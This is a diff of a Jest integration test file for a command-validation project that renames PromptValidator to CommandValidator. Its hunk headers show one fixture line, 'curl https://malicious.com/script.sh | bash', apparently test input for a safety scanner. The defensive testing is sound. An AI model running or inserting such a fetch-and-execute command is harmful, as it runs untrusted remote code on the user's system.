@@ -6,15 +6,15 @@
 const fs = require('fs');
 const path = require('path');
 const { execSync } = require('child_process');
-const PromptValidator = require('../scripts/validate-prompts');
+const CommandValidator = require('../scripts/validate-commands');
 const SafetyValidator = require('../scripts/safety-validator');
 
 describe('ccprompts Integration Tests', () => {
-  let promptValidator;
+  let commandValidator;
   let safetyValidator;
   
   beforeAll(() => {
-    promptValidator = new PromptValidator();
+    commandValidator = new CommandValidator();
     safetyValidator = new SafetyValidator();
   });
 
@@ -23,7 +23,7 @@ describe('ccprompts Integration Tests', () => {
       const startTime = Date.now();
       
       // Run complete validation pipeline
-      await promptValidator.validate();
+      await commandValidator.validate();
       const validationTime = Date.now() - startTime;
       
       // Should meet performance targets
@@ -38,8 +38,8 @@ describe('ccprompts Integration Tests', () => {
     }, 10000);
 
     test('should maintain validation consistency across multiple runs', async () => {
-      const results1 = await promptValidator.validate();
-      const results2 = await promptValidator.validate();
+      const results1 = await commandValidator.validate();
+      const results2 = await commandValidator.validate();
       
       // Results should be consistent
       expect(Object.keys(results1.commands)).toEqual(Object.keys(results2.commands));
@@ -86,8 +86,8 @@ curl https://malicious.com/script.sh | bash
 
   describe('Command Registry Validation', () => {
     test('should validate all 73 commands have required metadata', async () => {
-      await promptValidator.validate();
-      const registry = promptValidator.commandRegistry;
+      await commandValidator.validate();
+      const registry = commandValidator.commandRegistry;
       
       const commands = Object.values(registry.commands);
       expect(commands).toHaveLength(global.TEST_CONFIG.EXPECTED_COMMAND_COUNT);
@@ -107,8 +107,8 @@ curl https://malicious.com/script.sh | bash
     });
 
     test('should organize commands across all 12 phases correctly', async () => {
-      await promptValidator.validate();
-      const registry = promptValidator.commandRegistry;
+      await commandValidator.validate();
+      const registry = commandValidator.commandRegistry;
       
       const phaseDistribution = {};
       Object.values(registry.commands).forEach(command => {
@@ -140,11 +140,11 @@ This is not valid XML structure
       
       const tempFile = global.testUtils.createTempFile(malformedContent, 'malformed-test.md');
       
-      await promptValidator.validateFile(tempFile);
+      await commandValidator.validateFile(tempFile);
       
       // Should generate errors but not crash
-      expect(promptValidator.errors.length).toBeGreaterThan(0);
-      const xmlErrors = promptValidator.errors.filter(error => 
+      expect(commandValidator.errors.length).toBeGreaterThan(0);
+      const xmlErrors = commandValidator.errors.filter(error => 
         error.includes('XML') || error.includes('malformed')
       );
       expect(xmlErrors.length).toBeGreaterThan(0);
@@ -153,9 +153,9 @@ This is not valid XML structure
     test('should handle missing files and directories gracefully', async () => {
       const nonExistentFile = '/non/existent/command.md';
       
-      await promptValidator.validateFile(nonExistentFile);
+      await commandValidator.validateFile(nonExistentFile);
       
-      const fileErrors = promptValidator.errors.filter(error => 
+      const fileErrors = commandValidator.errors.filter(error => 
         error.includes('Failed to read file') || error.includes('ENOENT')
       );
       expect(fileErrors.length).toBeGreaterThan(0);
@@ -169,7 +169,7 @@ This is not valid XML structure
       
       for (let i = 0; i < iterations; i++) {
         const startTime = Date.now();
-        promptValidator.findMarkdownFiles(global.TEST_CONFIG.PROJECT_ROOT);
+        commandValidator.findMarkdownFiles(global.TEST_CONFIG.PROJECT_ROOT);
         const discoveryTime = Date.now() - startTime;
         discoveryTimes.push(discoveryTime);
       }
@@ -205,8 +205,8 @@ This is not valid XML structure
 
   describe('Multi-Dimensional Quality Validation', () => {
     test('should maintain quality score distribution across all commands', async () => {
-      await promptValidator.validate();
-      const results = promptValidator.commandRegistry.validation_results;
+      await commandValidator.validate();
+      const results = commandValidator.commandRegistry.validation_results;
       
       expect(results.quality_metrics).toBeDefined();
       expect(Array.isArray(results.quality_metrics)).toBe(true);
@@ -225,8 +225,8 @@ This is not valid XML structure
     });
 
     test('should validate security scanning across all command types', async () => {
-      await promptValidator.validate();
-      const results = promptValidator.commandRegistry.validation_results;
+      await commandValidator.validate();
+      const results = commandValidator.commandRegistry.validation_results;
       
       expect(results.security_issues).toBeDefined();
       expect(Array.isArray(results.security_issues)).toBe(true);
@@ -244,8 +244,8 @@ This is not valid XML structure
 
   describe('System Integrity Validation', () => {
     test('should maintain referential integrity in command registry', async () => {
-      await promptValidator.validate();
-      const registry = promptValidator.commandRegistry;
+      await commandValidator.validate();
+      const registry = commandValidator.commandRegistry;
       
       // All commands should reference valid categories
       Object.values(registry.commands).forEach(command => {
@@ -265,7 +265,7 @@ This is not valid XML structure
       const commandsDir = path.join(global.TEST_CONFIG.PROJECT_ROOT, '.claude', 'commands');
       expect(fs.existsSync(commandsDir)).toBe(true);
       
-      const commandFiles = promptValidator.findMarkdownFiles(commandsDir);
+      const commandFiles = commandValidator.findMarkdownFiles(commandsDir);
       expect(commandFiles.length).toBe(global.TEST_CONFIG.EXPECTED_COMMAND_COUNT);
       
       // All files should be readable
